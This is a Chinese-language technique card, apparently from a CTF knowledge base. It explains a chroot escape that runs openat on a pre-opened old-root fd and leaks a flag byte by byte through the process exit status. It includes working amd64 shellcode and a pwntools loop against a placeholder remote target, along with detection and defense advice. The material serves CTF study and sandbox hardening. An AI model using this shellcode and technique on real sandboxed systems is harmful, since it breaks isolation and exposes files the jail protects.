---
id: binary-pwn-sandbox-escape-chroot-openat-fd-exit-status-sidechannel
title: chroot 逃逸 + exit 状态侧信道：用预打开的根目录 fd 调 openat 并逐字节回显 flag
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: chroot-openat-preopened-fd-exit-status-sidechannel
aliases:
- chroot openat fd 逃逸
- 预打开根目录 fd
- openat(2, flag)
- exit 状态侧信道
- echo $? 回显 flag
- 逐字节 exit 泄漏
- chroot 逃逸
tags:
- binary
- pwn
- shellcode
- chroot
- sandbox-escape
- openat
- file-descriptor
- exit-status
- side-channel
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:39:00+08:00'
  notes: 已对照原文 chroot逃逸||exit侧信道 与 exp 核对：fd 2 预打开真实根、openat(2,"flag",0)、read、shellcode[-3]=i 按索引取字节、exit 状态经 echo $?/连接退出码逐字节回显；原文无图。未在本机复跑远程题目。
---

## 一句话结论

进程在 `chroot` 前把真实根目录打开在某个 fd（样例是 fd 2）上，chroot 后该 fd 仍指向旧根；shellcode 用 `openat(2, "flag", O_RDONLY)` 以相对路径打开 jail 外的 `/flag`，再用 `read` 读入内存，最后用 `exit(flag_byte)` 把字符放进进程退出状态，由 `run.sh` 的 `echo $?` 或远端连接关闭码逐字节回显，从而在无 write 输出通道时也能读出 flag。

## 原理

- **chroot 不关闭已有 fd**：`chroot()` 只改变路径解析的根（`fs->root`），不会关闭进程已打开的文件描述符。chroot 前打开的目录 fd 仍然引用原根目录；`openat(dirfd, pathname, flags)` 在 `pathname` 为相对路径时，以 `dirfd` 指向的目录为起点解析，不受新 root 限制。
- **样例的 fd 2**：题目在 fd 2（stderr）上打开了真实根目录，然后才 chroot。shellcode 调用 `openat(2, "flag", O_RDONLY)`，`dirfd=2` 指向旧根，相对路径 `"flag"` 解析为旧根下的 `/flag`，直接绕过 chroot。
- **read 后如何回显**：如果 `write`/`sendfile`/`splice` 等输出 syscall 被 seccomp 禁用，可利用 `exit(status)`：进程退出状态只保留 `status & 0xff`。把第 i 个 flag 字节放进 `rdi` 再 `exit`，父进程/run.sh 的 `echo $?` 会打印该字节的十进制值；每次连接只取一个字节，循环 30 次即可拼出完整 flag。
- **为什么不是普通 chroot fd 逃逸**：普通逃逸通常用 `fchdir(dirfd)` 或 `openat` 打开旧根下的任意文件；本场景的关键是“fd 2 被预置为真实根 + 无输出通道 + exit 状态作为侧信道”，把“读文件”和“带出数据”拆成两步。
- **shellcode 结构**：`openat(2, "flag", 0)` → `read(fd, buf, n)` → `mov edi, dword ptr [buf + i]` → `exit(60)`；每次运行只改索引立即数（样例直接改 shellcode 的倒数第 3 字节）。
- **exit 状态的可观测性**：本地可通过 `process().returncode` 读；远程如果由 `run.sh`/socat 包装并 `echo $?`，或平台返回连接退出码，也能读到。若状态不可见，可退化为连接关闭时机/超时侧信道。

## 触发条件

- 目标进程执行了 `chroot()`，但保留了指向旧根的目录 fd（尤其是 fd 0/1/2 被重定向到旧根）。
- 旧根下的 flag 对进程可读（chroot 前后权限未降）。
- 进程可执行任意 shellcode（RWX 页或函数指针调用），且 `openat`/`read`/`exit` 未被 seccomp 禁用。
- 攻击者能观察到进程退出状态（`echo $?`、`waitpid`、远程连接返回码）或至少能区分正常退出/异常退出。

## 利用步骤

1. 检查目标启动脚本与 fd 状态：是否在 chroot 前 `open(".", O_RDONLY)` 并 `dup2` 到 2；`/proc/<pid>/fd` 可见。
2. 构造 shellcode：
   - `openat(2, "flag", O_RDONLY)`；
   - `read(fd, buf, 0x100)`；
   - 取第 i 个字节到 `edi`；
   - `exit(60)`。
3. 每次连接把索引 i 写入 shellcode 的立即数位置（样例 `shellcode[-3]=i`）。
4. 触发 shellcode，读取进程退出码/run.sh 输出，得到该字节。
5. 循环 i=0..N，直到 `}` 或 30 字节；拼接 flag。

## PoC

```python
from pwn import *

context.log_level = "debug"

sc = asm('''
    push 2
    pop rdi
    push 0x67616c66          # "flag"
    push rsp
    pop rsi
    xor edx, edx
    mov ax, 0x101            # openat
    push rax
    syscall
    push rax
    pop rdi
    pop rdx
    xor eax, eax             # read
    syscall
    mov al, 0x3c             # exit
    mov edi, dword ptr [rsp+1]
    syscall
''', arch='amd64')

flag = ""
for i in range(30):
    shellcode = bytearray(sc)
    shellcode[-3] = i        # 取第 i 个字节
    r = remote("TARGET", 35427)
    r.recvuntil(b"ur show time")
    r.send(bytes(shellcode))
    flag += chr(int(r.recvall().strip(b"\n")))   # 远程 echo $?
    r.wait()
    # 本地可用：flag += chr(r.returncode)
print(flag)
```

## 变体与关联

- 变体：`dirfd` 换成其他预打开的目录 fd；用 `fchdir(fd)` + `open("flag")` 代替 `openat`。
- 变体：若 `exit` 被禁，用 `write`/`sendfile`/`splice` 输出；若退出码不可见，用连接是否挂起/关闭的时序侧信道。
- 变体：一次连接用一个字符的退出码，或用多字节 `exit` 状态（只能拿低 8 位）分批。
- 关联卡片：[[binary-pwn-sandbox-escape-chroot-cwd-double-chroot-fd-escape]]、[[binary-pwn-sandbox-escape-seccomp-openat2-pipe-splice]]、[[binary-pwn-sandbox-escape-shellcode-cmp-timeout-oracle]]。

## 检测与防御

- 检测：chroot 后进程仍持有旧根目录 fd；`openat` 的 `dirfd` 指向旧根且路径为相对路径。
- 检测：进程以 flag 字符为退出码反复启动/退出；`echo $?` 输出大量单字节值。
- 防御：chroot 前关闭除必要 fd 外的所有描述符，`chdir("/")`，并丢弃 CAP_SYS_CHROOT 等权限。
- 防御：使用 mount namespace/pivot_root 而非单独 chroot；seccomp 过滤 `openat`/`exit`；不要把退出状态暴露给不可信方。
